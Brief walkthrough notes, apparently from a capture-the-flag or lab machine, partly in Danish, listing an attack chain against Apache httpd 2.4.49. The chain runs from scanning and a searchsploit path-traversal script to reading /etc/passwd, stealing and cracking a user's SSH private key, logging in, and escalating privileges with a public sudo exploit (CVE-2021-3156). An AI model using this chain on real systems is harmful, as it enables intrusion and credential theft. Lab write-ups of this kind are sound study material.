nmap Apache httpd 2.4.49  ->
searchsploit Apache httpd 2.4.49  ->
multiple/webapps/50383.sh ->
find users i /etc/passwd ->
find sshkey i /home/anita/.ssh/id_ecdsa ->
./50383.sh target /home/anita/.ssh/id_ecdsa > id_ecdsa ->
ssh2john id_ecdsa ->
bruteforce password: fireball
chmod 600 id_ecsda; ssh -i id_ecdsa anita@ip

privesc:
linpeas
se sudo version:
brug sudo-make-me-a-sandwich
(https://github.com/blasty/CVE-2021-3156)